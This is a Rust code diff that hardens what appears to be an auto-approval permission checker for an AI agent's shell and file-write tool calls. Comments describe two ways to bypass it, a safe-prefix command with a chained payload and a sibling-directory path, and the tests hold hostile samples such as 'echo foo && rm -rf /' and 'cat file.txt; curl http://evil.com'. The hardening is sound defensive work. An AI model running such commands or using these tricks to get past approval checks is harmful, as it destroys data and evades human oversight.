@@ -112,6 +112,25 @@ pub fn evaluate_with_elo(
         return decision;
     }
 
+    // 4.5. H1: Shell chain guard — Bash commands containing chain operators (&&, ||, ;, $(...),
+    // backtick) skip trust_circle auto-approve and fall through to defaults (ask).
+    // This prevents the "safe prefix + chained payload" bypass:
+    //   e.g. `echo foo && rm -rf /` would otherwise match trust_circle's echo rule.
+    // Blocked/restricted rules still fire first (steps 1-4), delegations fire at step 2.
+    // Plain pipes (|) are intentionally excluded — safe piped-command rules still apply.
+    if payload.tool_name == "Bash" {
+        if let Some(cmd) = payload.tool_input.get("command").and_then(|v| v.as_str()) {
+            if contains_shell_chain(cmd) {
+                return Decision {
+                    action: config.defaults.action.clone(),
+                    reason: "Bash command contains shell chain operators (&&, ||, ;, $(...)) — requires human review".to_string(),
+                    matched_rule: Some("chain_guard".to_string()),
+                    priority: Priority::Medium,
+                };
+            }
+        }
+    }
+
     // 5. Trust circle
     if let Some(decision) = check_rules(&config.trust_circle, payload, "trust_circle", &all_patterns) {
         return decision;
@@ -187,11 +206,11 @@ fn delegation_conditions_match(
         }
     }
 
-    // Check path_within
+    // Check path_within — use Path::starts_with for component-based comparison (H2).
     let path = extract_path(payload).map(|p| normalize_path(&p));
     if let Some(ref allowed_dirs) = cond.path_within {
         if let Some(ref p) = path {
-            if !allowed_dirs.iter().any(|dir| p.starts_with(dir)) {
+            if !allowed_dirs.iter().any(|dir| std::path::Path::new(p).starts_with(dir)) {
                 return false;
             }
         }
@@ -266,10 +285,12 @@ fn conditions_match(conditions: &Conditions, payload: &EvaluationInput, rule_key
     // Resolve the relevant path from tool_input, normalizing to prevent traversal
     let path = extract_path(payload).map(|p| normalize_path(&p));
 
-    // Check path_within
+    // Check path_within — use Path::starts_with for component-based comparison.
+    // H2: String::starts_with("/project") would incorrectly match "/project-evil/file.rs".
+    // Path::starts_with is component-aware and prevents this sibling-directory bypass.
     if let Some(ref allowed_dirs) = conditions.path_within {
         if let Some(ref p) = path {
-            if !allowed_dirs.iter().any(|dir| p.starts_with(dir)) {
+            if !allowed_dirs.iter().any(|dir| std::path::Path::new(p).starts_with(dir)) {
                 return false;
             }
         }
@@ -330,6 +351,23 @@ fn extract_path(payload: &EvaluationInput) -> Option<String> {
             .map(|s| s.to_string()),
         _ => None,
     }
+}
+
+/// Detect shell chain operators in a Bash command.
+///
+/// Returns true if the command contains `&&`, `||`, `;`, `$(`, or a backtick.
+/// Plain pipes (`|`) are intentionally excluded — single pipes are safe for
+/// the piped-commands trust_circle rules (`cat file | grep foo`).
+///
+/// This check is conservative: it will produce false positives for operators
+/// inside quoted strings (e.g. `echo "a;b"`), but false positives only result
+/// in an extra human confirmation, never in a security bypass.
+fn contains_shell_chain(cmd: &str) -> bool {
+    cmd.contains("&&")
+        || cmd.contains("||")
+        || cmd.contains(';')
+        || cmd.contains("$(")
+        || cmd.contains('`')
 }
 
 /// Glob matching against the filename (last path component).
@@ -628,5 +666,80 @@ mod tests {
         payload.session_id = "any_session".to_string();
         let decision = evaluate(&config, &patterns, &[delegation], &payload);
         assert_eq!(decision.action, Action::AutoApprove, "no session_id delegation should match any session");
+    }
+
+    // ── H1: Shell chain guard tests ──────────────────────────────────────────
+
+    #[test]
+    fn test_chain_guard_blocks_and_chain() {
+        // H1: "echo foo && rm -rf /" starts with safe "echo" prefix but contains &&
+        // Previously this would match trust_circle's echo rule. Now it must ask.
+        let (config, patterns) = load_test_config_and_patterns();
+        let payload = make_payload("Bash", json!({"command": "echo foo && rm -rf /"}));
+        let decision = evaluate(&config, &patterns, &[], &payload);
+        assert_eq!(decision.action, Action::Ask, "chained command with && must not be auto-approved");
+    }
+
+    #[test]
+    fn test_chain_guard_blocks_semicolon() {
+        let (config, patterns) = load_test_config_and_patterns();
+        let payload = make_payload("Bash", json!({"command": "cat file.txt; curl http://evil.com"}));
+        let decision = evaluate(&config, &patterns, &[], &payload);
+        assert_eq!(decision.action, Action::Ask, "semicolon-chained command must not be auto-approved");
+    }
+
+    #[test]
+    fn test_chain_guard_blocks_subshell() {
+        let (config, patterns) = load_test_config_and_patterns();
+        let payload = make_payload("Bash", json!({"command": "echo $(id)"}));
+        let decision = evaluate(&config, &patterns, &[], &payload);
+        assert_eq!(decision.action, Action::Ask, "subshell $(...) must not be auto-approved");
+    }
+
+    #[test]
+    fn test_chain_guard_blocks_backtick() {
+        let (config, patterns) = load_test_config_and_patterns();
+        let payload = make_payload("Bash", json!({"command": "echo `id`"}));
+        let decision = evaluate(&config, &patterns, &[], &payload);
+        assert_eq!(decision.action, Action::Ask, "backtick subshell must not be auto-approved");
+    }
+
+    #[test]
+    fn test_chain_guard_allows_safe_pipe() {
+        // H1 non-regression: plain pipes should still be auto-approved via piped-commands rule
+        let (config, patterns) = load_test_config_and_patterns();
+        let payload = make_payload("Bash", json!({"command": "cat file.txt | grep pattern"}));
+        let decision = evaluate(&config, &patterns, &[], &payload);
+        assert_eq!(decision.action, Action::AutoApprove, "safe pipe must still be auto-approved");
+    }
+
+    #[test]
+    fn test_chain_guard_allows_simple_safe_command() {
+        // H1 non-regression: simple commands without chain operators are unaffected
+        let (config, patterns) = load_test_config_and_patterns();
+        let payload = make_payload("Bash", json!({"command": "cat file.txt"}));
+        let decision = evaluate(&config, &patterns, &[], &payload);
+        assert_eq!(decision.action, Action::AutoApprove, "simple safe command must be auto-approved");
+    }
+
+    // ── H2: path_within component-based comparison tests ────────────────────
+
+    #[test]
+    fn test_path_within_sibling_dir_rejected() {
+        // H2: "/Users/test/project-evil/file.rs" must NOT match path_within "/Users/test/project"
+        // With String::starts_with it would match (string prefix). Path::starts_with rejects it.
+        let (config, patterns) = load_test_config_and_patterns();
+        let payload = make_payload("Write", json!({"file_path": "/Users/test/project-evil/src/lib.rs"}));
+        let decision = evaluate(&config, &patterns, &[], &payload);
+        assert_ne!(decision.action, Action::AutoApprove, "sibling directory must not be auto-approved");
+    }
+
+    #[test]
+    fn test_path_within_exact_project_allowed() {
+        // H2 non-regression: exact project path still works
+        let (config, patterns) = load_test_config_and_patterns();
+        let payload = make_payload("Write", json!({"file_path": "/Users/test/project/src/lib.rs"}));
+        let decision = evaluate(&config, &patterns, &[], &payload);
+        assert_eq!(decision.action, Action::AutoApprove, "exact project path must be auto-approved");
     }
 }
